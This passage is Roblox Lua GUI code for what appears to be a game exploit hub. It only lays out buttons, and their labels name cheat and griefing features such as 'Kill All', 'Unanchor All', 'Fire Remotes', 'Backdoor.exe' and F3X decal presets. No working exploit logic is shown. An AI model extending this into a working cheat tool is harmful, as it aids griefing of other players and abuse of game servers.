button_16.Position = UDim2.new(0.523489952, 0, 0.0980392173, 0)
button_16.Size = UDim2.new(0, 71, 0, 25)
button_16.Font = Enum.Font.SourceSans
button_16.Text = "Change Name"
button_16.TextColor3 = Color3.fromRGB(255, 255, 255)
button_16.TextSize = 14.000

button_17.Name = "button"
button_17.Parent = lp
button_17.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_17.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_17.BorderSizePixel = 3
button_17.Position = UDim2.new(0, 0, 0.179738566, 0)
button_17.Size = UDim2.new(0, 71, 0, 25)
button_17.Font = Enum.Font.SourceSans
button_17.Text = "Set Walkspeed"
button_17.TextColor3 = Color3.fromRGB(255, 255, 255)
button_17.TextSize = 14.000

button_18.Name = "button"
button_18.Parent = lp
button_18.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_18.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_18.BorderSizePixel = 3
button_18.Position = UDim2.new(0.523489952, 0, 0.179738566, 0)
button_18.Size = UDim2.new(0, 71, 0, 25)
button_18.Font = Enum.Font.SourceSans
button_18.Text = "Floating Pad"
button_18.TextColor3 = Color3.fromRGB(255, 255, 255)
button_18.TextSize = 14.000

button_19.Name = "button"
button_19.Parent = lp
button_19.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_19.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_19.BorderSizePixel = 3
button_19.Position = UDim2.new(0, 0, 0.261437923, 0)
button_19.Size = UDim2.new(0, 71, 0, 25)
button_19.Font = Enum.Font.SourceSans
button_19.Text = "Set Platform"
button_19.TextColor3 = Color3.fromRGB(255, 255, 255)
button_19.TextSize = 14.000

button_20.Name = "button"
button_20.Parent = lp
button_20.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_20.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_20.BorderSizePixel = 3
button_20.Position = UDim2.new(0.523489952, 0, 0.261437923, 0)
button_20.Size = UDim2.new(0, 71, 0, 25)
button_20.Font = Enum.Font.SourceSans
button_20.Text = "Spam Text"
button_20.TextColor3 = Color3.fromRGB(255, 255, 255)
button_20.TextSize = 14.000

button_21.Name = "button"
button_21.Parent = lp
button_21.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_21.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_21.BorderSizePixel = 3
button_21.Position = UDim2.new(0, 0, 0.343137264, 0)
button_21.Size = UDim2.new(0, 71, 0, 25)
button_21.Font = Enum.Font.SourceSans
button_21.Text = "Chicken Arms"
button_21.TextColor3 = Color3.fromRGB(255, 255, 255)
button_21.TextSize = 14.000

button_22.Name = "button"
button_22.Parent = lp
button_22.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_22.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_22.BorderSizePixel = 3
button_22.Position = UDim2.new(0.523489952, 0, 0.343137264, 0)
button_22.Size = UDim2.new(0, 71, 0, 25)
button_22.Font = Enum.Font.SourceSans
button_22.Text = "Set Gravity"
button_22.TextColor3 = Color3.fromRGB(255, 255, 255)
button_22.TextSize = 14.000

button_23.Name = "button"
button_23.Parent = lp
button_23.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_23.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_23.BorderSizePixel = 3
button_23.Position = UDim2.new(0, 0, 0.424836606, 0)
button_23.Size = UDim2.new(0, 71, 0, 25)
button_23.Font = Enum.Font.SourceSans
button_23.Text = "Set Jump"
button_23.TextColor3 = Color3.fromRGB(255, 255, 255)
button_23.TextSize = 14.000

button_24.Name = "button"
button_24.Parent = lp
button_24.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_24.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_24.BorderSizePixel = 3
button_24.Position = UDim2.new(0.523489952, 0, 0.424836606, 0)
button_24.Size = UDim2.new(0, 71, 0, 25)
button_24.ZIndex = 2
button_24.Font = Enum.Font.SourceSans
button_24.Text = "Head Shake"
button_24.TextColor3 = Color3.fromRGB(255, 255, 255)
button_24.TextSize = 14.000

pgname.Name = "pgname"
pgname.Parent = page1
pgname.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
pgname.BorderColor3 = Color3.fromRGB(255, 0, 0)
pgname.BorderSizePixel = 3
pgname.LayoutOrder = 3
pgname.Position = UDim2.new(-0.00333332852, 0, 0.86601305, 0)
pgname.Size = UDim2.new(0, 300, 0, 40)
pgname.ZIndex = 3
pgname.Font = Enum.Font.SourceSansBold
pgname.Text = "Page 1"
pgname.TextColor3 = Color3.fromRGB(255, 255, 255)
pgname.TextSize = 19.000

page3.Name = "page3"
page3.Parent = main
page3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
page3.BorderColor3 = Color3.fromRGB(255, 0, 0)
page3.BorderSizePixel = 3
page3.Position = UDim2.new(0, 0, 0.182500005, 0)
page3.Size = UDim2.new(0, 298, 0, 306)
page3.Visible = false

guir.Name = "guir"
guir.Parent = page3
guir.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
guir.BorderColor3 = Color3.fromRGB(255, 0, 0)
guir.BorderSizePixel = 3
guir.Size = UDim2.new(0, 149, 0, 306)

sectitle_3.Name = "sectitle"
sectitle_3.Parent = guir
sectitle_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sectitle_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
sectitle_3.BorderSizePixel = 3
sectitle_3.Size = UDim2.new(0, 149, 0, 30)
sectitle_3.Font = Enum.Font.SourceSansBold
sectitle_3.Text = "Guis and Remotes"
sectitle_3.TextColor3 = Color3.fromRGB(255, 255, 255)
sectitle_3.TextSize = 14.000

button_25.Name = "button"
button_25.Parent = guir
button_25.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_25.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_25.BorderSizePixel = 3
button_25.Position = UDim2.new(0, 0, 0.0980392173, 0)
button_25.Size = UDim2.new(0, 71, 0, 25)
button_25.Font = Enum.Font.SourceSans
button_25.Text = "T0PK3K"
button_25.TextColor3 = Color3.fromRGB(255, 255, 255)
button_25.TextSize = 14.000

button_26.Name = "button"
button_26.Parent = guir
button_26.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_26.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_26.BorderSizePixel = 3
button_26.Position = UDim2.new(0.523489952, 0, 0.0980392173, 0)
button_26.Size = UDim2.new(0, 71, 0, 25)
button_26.Font = Enum.Font.SourceSans
button_26.Text = "Admin Panel"
button_26.TextColor3 = Color3.fromRGB(255, 255, 255)
button_26.TextSize = 14.000

button_27.Name = "button"
button_27.Parent = guir
button_27.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_27.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_27.BorderSizePixel = 3
button_27.Position = UDim2.new(0, 0, 0.179738566, 0)
button_27.Size = UDim2.new(0, 71, 0, 25)
button_27.Font = Enum.Font.SourceSans
button_27.Text = "Project Soviet"
button_27.TextColor3 = Color3.fromRGB(255, 255, 255)
button_27.TextSize = 14.000

button_28.Name = "button"
button_28.Parent = guir
button_28.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_28.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_28.BorderSizePixel = 3
button_28.Position = UDim2.new(0.523489952, 0, 0.179738566, 0)
button_28.Size = UDim2.new(0, 71, 0, 25)
button_28.Font = Enum.Font.SourceSans
button_28.Text = "Harked"
button_28.TextColor3 = Color3.fromRGB(255, 255, 255)
button_28.TextSize = 14.000

button_29.Name = "button"
button_29.Parent = guir
button_29.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_29.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_29.BorderSizePixel = 3
button_29.Position = UDim2.new(0.523489952, 0, 0.343137264, 0)
button_29.Size = UDim2.new(0, 71, 0, 25)
button_29.Font = Enum.Font.SourceSans
button_29.Text = "Fire Remotes"
button_29.TextColor3 = Color3.fromRGB(255, 255, 255)
button_29.TextSize = 14.000

button_30.Name = "button"
button_30.Parent = guir
button_30.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_30.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_30.BorderSizePixel = 3
button_30.Position = UDim2.new(0, 0, 0.343137264, 0)
button_30.Size = UDim2.new(0, 71, 0, 25)
button_30.Font = Enum.Font.SourceSans
button_30.Text = "Comet"
button_30.TextColor3 = Color3.fromRGB(255, 255, 255)
button_30.TextSize = 14.000

button_31.Name = "button"
button_31.Parent = guir
button_31.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_31.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_31.BorderSizePixel = 3
button_31.Position = UDim2.new(0.523489952, 0, 0.261437923, 0)
button_31.Size = UDim2.new(0, 71, 0, 25)
button_31.Font = Enum.Font.SourceSans
button_31.Text = "SimpleSpy"
button_31.TextColor3 = Color3.fromRGB(255, 255, 255)
button_31.TextSize = 14.000

button_32.Name = "button"
button_32.Parent = guir
button_32.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_32.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_32.BorderSizePixel = 3
button_32.Position = UDim2.new(0, 0, 0.261437923, 0)
button_32.Size = UDim2.new(0, 71, 0, 25)
button_32.Font = Enum.Font.SourceSans
button_32.Text = "FraktureSS"
button_32.TextColor3 = Color3.fromRGB(255, 255, 255)
button_32.TextSize = 14.000

button_33.Name = "button"
button_33.Parent = guir
button_33.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_33.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_33.BorderSizePixel = 3
button_33.Position = UDim2.new(0, 0, 0.424836606, 0)
button_33.Size = UDim2.new(0, 71, 0, 25)
button_33.Font = Enum.Font.SourceSans
button_33.Text = "ReplicationUI"
button_33.TextColor3 = Color3.fromRGB(255, 255, 255)
button_33.TextSize = 14.000

button_34.Name = "button"
button_34.Parent = guir
button_34.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_34.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_34.BorderSizePixel = 3
button_34.Position = UDim2.new(0.523489952, 0, 0.424836606, 0)
button_34.Size = UDim2.new(0, 71, 0, 25)
button_34.Font = Enum.Font.SourceSans
button_34.Text = "Backdoor.exe"
button_34.TextColor3 = Color3.fromRGB(255, 255, 255)
button_34.TextSize = 14.000

misc.Name = "misc"
misc.Parent = page3
misc.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
misc.BorderColor3 = Color3.fromRGB(255, 0, 0)
misc.BorderSizePixel = 3
misc.Position = UDim2.new(0.5, 0, 0, 0)
misc.Size = UDim2.new(0, 149, 0, 306)

sectitle_4.Name = "sectitle"
sectitle_4.Parent = misc
sectitle_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sectitle_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
sectitle_4.BorderSizePixel = 3
sectitle_4.Size = UDim2.new(0, 149, 0, 30)
sectitle_4.Font = Enum.Font.SourceSansBold
sectitle_4.Text = "Misc."
sectitle_4.TextColor3 = Color3.fromRGB(255, 255, 255)
sectitle_4.TextSize = 14.000

button_35.Name = "button"
button_35.Parent = misc
button_35.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_35.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_35.BorderSizePixel = 3
button_35.Position = UDim2.new(0, 0, 0.0980392173, 0)
button_35.Size = UDim2.new(0, 71, 0, 25)
button_35.Font = Enum.Font.SourceSans
button_35.Text = "Punch Tool"
button_35.TextColor3 = Color3.fromRGB(255, 255, 255)
button_35.TextSize = 14.000

button_36.Name = "button"
button_36.Parent = misc
button_36.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_36.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_36.BorderSizePixel = 3
button_36.Position = UDim2.new(0.523489952, 0, 0.0980392173, 0)
button_36.Size = UDim2.new(0, 71, 0, 25)
button_36.Font = Enum.Font.SourceSans
button_36.Text = "Classic Btools"
button_36.TextColor3 = Color3.fromRGB(255, 255, 255)
button_36.TextSize = 14.000

button_37.Name = "button"
button_37.Parent = misc
button_37.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_37.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_37.BorderSizePixel = 3
button_37.Position = UDim2.new(0, 0, 0.179738566, 0)
button_37.Size = UDim2.new(0, 71, 0, 25)
button_37.Font = Enum.Font.SourceSans
button_37.Text = "UFO (iOrb)"
button_37.TextColor3 = Color3.fromRGB(255, 255, 255)
button_37.TextSize = 14.000

button_38.Name = "button"
button_38.Parent = misc
button_38.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_38.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_38.BorderSizePixel = 3
button_38.Position = UDim2.new(0.523489952, 0, 0.179738566, 0)
button_38.Size = UDim2.new(0, 71, 0, 25)
button_38.Font = Enum.Font.SourceSans
button_38.Text = "commit oof"
button_38.TextColor3 = Color3.fromRGB(255, 255, 255)
button_38.TextSize = 14.000

button_39.Name = "button"
button_39.Parent = misc
button_39.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_39.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_39.BorderSizePixel = 3
button_39.Position = UDim2.new(0, 0, 0.261437923, 0)
button_39.Size = UDim2.new(0, 71, 0, 25)
button_39.Font = Enum.Font.SourceSans
button_39.Text = "Destroy GUI"
button_39.TextColor3 = Color3.fromRGB(255, 255, 255)
button_39.TextSize = 14.000

button_40.Name = "button"
button_40.Parent = misc
button_40.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_40.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_40.BorderSizePixel = 3
button_40.Position = UDim2.new(0.523489952, 0, 0.261437923, 0)
button_40.Size = UDim2.new(0, 71, 0, 25)
button_40.Font = Enum.Font.SourceSans
button_40.Text = "Dex Explorer"
button_40.TextColor3 = Color3.fromRGB(255, 255, 255)
button_40.TextSize = 14.000

button_41.Name = "button"
button_41.Parent = misc
button_41.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_41.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_41.BorderSizePixel = 3
button_41.Position = UDim2.new(0, 0, 0.343137264, 0)
button_41.Size = UDim2.new(0, 71, 0, 25)
button_41.Font = Enum.Font.SourceSans
button_41.Text = "Sword Tool"
button_41.TextColor3 = Color3.fromRGB(255, 255, 255)
button_41.TextSize = 14.000

button_42.Name = "button"
button_42.Parent = misc
button_42.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_42.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_42.BorderSizePixel = 3
button_42.Position = UDim2.new(0.523489952, 0, 0.343137264, 0)
button_42.Size = UDim2.new(0, 71, 0, 25)
button_42.Font = Enum.Font.SourceSans
button_42.Text = "Discord Invite"
button_42.TextColor3 = Color3.fromRGB(255, 255, 255)
button_42.TextSize = 14.000

pgname_2.Name = "pgname"
pgname_2.Parent = page3
pgname_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
pgname_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
pgname_2.BorderSizePixel = 3
pgname_2.LayoutOrder = 3
pgname_2.Position = UDim2.new(-0.00333332852, 0, 0.86601305, 0)
pgname_2.Size = UDim2.new(0, 300, 0, 40)
pgname_2.ZIndex = 3
pgname_2.Font = Enum.Font.SourceSansBold
pgname_2.Text = "Page 3"
pgname_2.TextColor3 = Color3.fromRGB(255, 255, 255)
pgname_2.TextSize = 19.000

page2.Name = "page2"
page2.Parent = main
page2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
page2.BorderColor3 = Color3.fromRGB(255, 0, 0)
page2.BorderSizePixel = 3
page2.Position = UDim2.new(0, 0, 0.182500005, 0)
page2.Size = UDim2.new(0, 298, 0, 306)
page2.Visible = false

fds.Name = "fds"
fds.Parent = page2
fds.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
fds.BorderColor3 = Color3.fromRGB(255, 0, 0)
fds.BorderSizePixel = 3
fds.Size = UDim2.new(0, 149, 0, 306)

sectitle_5.Name = "sectitle"
sectitle_5.Parent = fds
sectitle_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sectitle_5.BorderColor3 = Color3.fromRGB(255, 0, 0)
sectitle_5.BorderSizePixel = 3
sectitle_5.Size = UDim2.new(0, 149, 0, 30)
sectitle_5.Font = Enum.Font.SourceSansBold
sectitle_5.Text = "Client-Sided Scripts (NOBODY SEES THEM)"
sectitle_5.TextColor3 = Color3.fromRGB(255, 255, 255)
sectitle_5.TextSize = 14.000
sectitle_5.TextWrapped = true

button_43.Name = "button"
button_43.Parent = fds
button_43.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_43.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_43.BorderSizePixel = 3
button_43.Position = UDim2.new(0, 0, 0.0980392173, 0)
button_43.Size = UDim2.new(0, 71, 0, 25)
button_43.Font = Enum.Font.SourceSans
button_43.Text = "Play Music"
button_43.TextColor3 = Color3.fromRGB(255, 255, 255)
button_43.TextSize = 14.000

button_44.Name = "button"
button_44.Parent = fds
button_44.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_44.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_44.BorderSizePixel = 3
button_44.Position = UDim2.new(0.523489952, 0, 0.0980392173, 0)
button_44.Size = UDim2.new(0, 71, 0, 25)
button_44.Font = Enum.Font.SourceSans
button_44.Text = "Disco Fog"
button_44.TextColor3 = Color3.fromRGB(255, 255, 255)
button_44.TextSize = 14.000

button_45.Name = "button"
button_45.Parent = fds
button_45.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_45.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_45.BorderSizePixel = 3
button_45.Position = UDim2.new(0, 0, 0.179738566, 0)
button_45.Size = UDim2.new(0, 71, 0, 25)
button_45.Font = Enum.Font.SourceSans
button_45.Text = "c00lify"
button_45.TextColor3 = Color3.fromRGB(255, 255, 255)
button_45.TextSize = 14.000

button_46.Name = "button"
button_46.Parent = fds
button_46.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_46.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_46.BorderSizePixel = 3
button_46.Position = UDim2.new(0.523489952, 0, 0.179738566, 0)
button_46.Size = UDim2.new(0, 71, 0, 25)
button_46.Font = Enum.Font.SourceSans
button_46.Text = "MLG Particles"
button_46.TextColor3 = Color3.fromRGB(255, 255, 255)
button_46.TextSize = 14.000

btools.Name = "btools"
btools.Parent = page2
btools.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
btools.BorderColor3 = Color3.fromRGB(255, 0, 0)
btools.BorderSizePixel = 3
btools.Position = UDim2.new(0.5, 0, 0, 0)
btools.Size = UDim2.new(0, 149, 0, 306)

sectitle_6.Name = "sectitle"
sectitle_6.Parent = btools
sectitle_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sectitle_6.BorderColor3 = Color3.fromRGB(255, 0, 0)
sectitle_6.BorderSizePixel = 3
sectitle_6.Size = UDim2.new(0, 149, 0, 30)
sectitle_6.Font = Enum.Font.SourceSansBold
sectitle_6.Text = "F3X Scripts"
sectitle_6.TextColor3 = Color3.fromRGB(255, 255, 255)
sectitle_6.TextSize = 14.000

button_47.Name = "button"
button_47.Parent = btools
button_47.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_47.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_47.BorderSizePixel = 3
button_47.Position = UDim2.new(0, 0, 0.0980392173, 0)
button_47.Size = UDim2.new(0, 71, 0, 25)
button_47.Font = Enum.Font.SourceSans
button_47.Text = "Set Skybox"
button_47.TextColor3 = Color3.fromRGB(255, 255, 255)
button_47.TextSize = 14.000

button_48.Name = "button"
button_48.Parent = btools
button_48.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_48.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_48.BorderSizePixel = 3
button_48.Position = UDim2.new(0.523489952, 0, 0.0980392173, 0)
button_48.Size = UDim2.new(0, 71, 0, 25)
button_48.Font = Enum.Font.SourceSans
button_48.Text = "Set Decal"
button_48.TextColor3 = Color3.fromRGB(255, 255, 255)
button_48.TextSize = 14.000

button_49.Name = "button"
button_49.Parent = btools
button_49.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_49.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_49.BorderSizePixel = 3
button_49.Position = UDim2.new(0, 0, 0.179738566, 0)
button_49.Size = UDim2.new(0, 71, 0, 25)
button_49.Font = Enum.Font.SourceSans
button_49.Text = "Fire Parts"
button_49.TextColor3 = Color3.fromRGB(255, 255, 255)
button_49.TextSize = 14.000

button_50.Name = "button"
button_50.Parent = btools
button_50.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_50.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_50.BorderSizePixel = 3
button_50.Position = UDim2.new(0.523489952, 0, 0.179738566, 0)
button_50.Size = UDim2.new(0, 71, 0, 25)
button_50.Font = Enum.Font.SourceSans
button_50.Text = "Fire All"
button_50.TextColor3 = Color3.fromRGB(255, 255, 255)
button_50.TextSize = 14.000

button_51.Name = "button"
button_51.Parent = btools
button_51.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_51.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_51.BorderSizePixel = 3
button_51.Position = UDim2.new(0, 0, 0.261437923, 0)
button_51.Size = UDim2.new(0, 71, 0, 25)
button_51.Font = Enum.Font.SourceSans
button_51.Text = "Raining Toad"
button_51.TextColor3 = Color3.fromRGB(255, 255, 255)
button_51.TextSize = 14.000

button_52.Name = "button"
button_52.Parent = btools
button_52.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_52.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_52.BorderSizePixel = 3
button_52.Position = UDim2.new(0.523489952, 0, 0.261437923, 0)
button_52.Size = UDim2.new(0, 71, 0, 25)
button_52.Font = Enum.Font.SourceSans
button_52.Text = "Kill All"
button_52.TextColor3 = Color3.fromRGB(255, 255, 255)
button_52.TextSize = 14.000

button_53.Name = "button"
button_53.Parent = btools
button_53.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_53.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_53.BorderSizePixel = 3
button_53.Position = UDim2.new(0, 0, 0.343137264, 0)
button_53.Size = UDim2.new(0, 71, 0, 25)
button_53.Font = Enum.Font.SourceSans
button_53.Text = "Set Baseplate"
button_53.TextColor3 = Color3.fromRGB(255, 255, 255)
button_53.TextSize = 14.000

button_54.Name = "button"
button_54.Parent = btools
button_54.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_54.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_54.BorderSizePixel = 3
button_54.Position = UDim2.new(0.523489952, 0, 0.343137264, 0)
button_54.Size = UDim2.new(0, 71, 0, 25)
button_54.Font = Enum.Font.SourceSans
button_54.Text = "Bighead All"
button_54.TextColor3 = Color3.fromRGB(255, 255, 255)
button_54.TextSize = 14.000

button_55.Name = "button"
button_55.Parent = btools
button_55.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_55.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_55.BorderSizePixel = 3
button_55.Position = UDim2.new(0, 0, 0.424836606, 0)
button_55.Size = UDim2.new(0, 71, 0, 25)
button_55.Font = Enum.Font.SourceSans
button_55.Text = "Unanchor All"
button_55.TextColor3 = Color3.fromRGB(255, 255, 255)
button_55.TextSize = 14.000

button_56.Name = "button"
button_56.Parent = btools
button_56.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_56.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_56.BorderSizePixel = 3
button_56.Position = UDim2.new(0.523489952, 0, 0.424836606, 0)
button_56.Size = UDim2.new(0, 71, 0, 25)
button_56.Font = Enum.Font.SourceSans
button_56.Text = "Disco All"
button_56.TextColor3 = Color3.fromRGB(255, 255, 255)
button_56.TextSize = 14.000

button_57.Name = "button"
button_57.Parent = btools
button_57.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_57.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_57.BorderSizePixel = 3
button_57.Position = UDim2.new(0, 0, 0.506535947, 0)
button_57.Size = UDim2.new(0, 71, 0, 25)
button_57.ZIndex = 2
button_57.Font = Enum.Font.SourceSans
button_57.Text = "Raining Luigi"
button_57.TextColor3 = Color3.fromRGB(255, 255, 255)
button_57.TextSize = 14.000

pgname_3.Name = "pgname"
pgname_3.Parent = page2
pgname_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
pgname_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
pgname_3.BorderSizePixel = 3
pgname_3.LayoutOrder = 3
pgname_3.Position = UDim2.new(-0.00333332852, 0, 0.86601305, 0)
pgname_3.Size = UDim2.new(0, 300, 0, 40)
pgname_3.ZIndex = 3
pgname_3.Font = Enum.Font.SourceSansBold
pgname_3.Text = "Page 2"
pgname_3.TextColor3 = Color3.fromRGB(255, 255, 255)
pgname_3.TextSize = 19.000

page4.Name = "page4"
page4.Parent = main
page4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
page4.BorderColor3 = Color3.fromRGB(255, 0, 0)
page4.BorderSizePixel = 3
page4.Position = UDim2.new(0, 0, 0.182500005, 0)
page4.Size = UDim2.new(0, 298, 0, 306)
page4.Visible = false

pres.Name = "pres"
pres.Parent = page4
pres.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
pres.BorderColor3 = Color3.fromRGB(255, 0, 0)
pres.BorderSizePixel = 3
pres.Size = UDim2.new(0, 149, 0, 306)

sectitle_7.Name = "sectitle"
sectitle_7.Parent = pres
sectitle_7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sectitle_7.BorderColor3 = Color3.fromRGB(255, 0, 0)
sectitle_7.BorderSizePixel = 3
sectitle_7.Size = UDim2.new(0, 149, 0, 30)
sectitle_7.Font = Enum.Font.SourceSansBold
sectitle_7.Text = "Skybox/Decal Presets    (F3X)"
sectitle_7.TextColor3 = Color3.fromRGB(255, 255, 255)
sectitle_7.TextSize = 14.000
sectitle_7.TextWrapped = true

button_58.Name = "button"
button_58.Parent = pres
button_58.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_58.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_58.BorderSizePixel = 3
button_58.Position = UDim2.new(0, 0, 0.0980392173, 0)
button_58.Size = UDim2.new(0, 71, 0, 25)
button_58.Font = Enum.Font.SourceSans
button_58.Text = "c00lkidd"
button_58.TextColor3 = Color3.fromRGB(255, 255, 255)
button_58.TextSize = 14.000

button_59.Name = "button"
button_59.Parent = pres
button_59.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_59.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_59.BorderSizePixel = 3
button_59.Position = UDim2.new(0.523489952, 0, 0.0980392173, 0)
button_59.Size = UDim2.new(0, 71, 0, 25)
button_59.Font = Enum.Font.SourceSans
button_59.Text = "1x3x5x6"
button_59.TextColor3 = Color3.fromRGB(255, 255, 255)
button_59.TextSize = 14.000

button_60.Name = "button"
button_60.Parent = pres
button_60.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_60.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_60.BorderSizePixel = 3
button_60.Position = UDim2.new(0, 0, 0.179738566, 0)
button_60.Size = UDim2.new(0, 71, 0, 25)
button_60.Font = Enum.Font.SourceSans
button_60.Text = "skrubl0rdz"
button_60.TextColor3 = Color3.fromRGB(255, 255, 255)
button_60.TextSize = 14.000

button_61.Name = "button"
button_61.Parent = pres
button_61.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_61.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_61.BorderSizePixel = 3
button_61.Position = UDim2.new(0.523489952, 0, 0.179738566, 0)
button_61.Size = UDim2.new(0, 71, 0, 25)
button_61.Font = Enum.Font.SourceSans
button_61.Text = "k00pkidd"
button_61.TextColor3 = Color3.fromRGB(255, 255, 255)
button_61.TextSize = 14.000

button_62.Name = "button"
button_62.Parent = pres
button_62.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_62.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_62.BorderSizePixel = 3
button_62.Position = UDim2.new(0.523489952, 0, 0.261437923, 0)
button_62.Size = UDim2.new(0, 71, 0, 25)
button_62.Font = Enum.Font.SourceSans
button_62.Text = "007n7"
button_62.TextColor3 = Color3.fromRGB(255, 255, 255)
button_62.TextSize = 14.000

button_63.Name = "button"
button_63.Parent = pres
button_63.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_63.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_63.BorderSizePixel = 3
button_63.Position = UDim2.new(0, 0, 0.261437923, 0)
button_63.Size = UDim2.new(0, 71, 0, 25)
button_63.Font = Enum.Font.SourceSans
button_63.Text = "cK Logo"
button_63.TextColor3 = Color3.fromRGB(255, 255, 255)
button_63.TextSize = 14.000

creds.Name = "creds"
creds.Parent = page4
creds.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
creds.BorderColor3 = Color3.fromRGB(255, 0, 0)
creds.BorderSizePixel = 3
creds.Position = UDim2.new(0.5, 0, 0, 0)
creds.Size = UDim2.new(0, 149, 0, 306)

credits.Name = "credits"
credits.Parent = creds
credits.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
credits.BorderColor3 = Color3.fromRGB(255, 0, 0)
credits.BorderSizePixel = 3
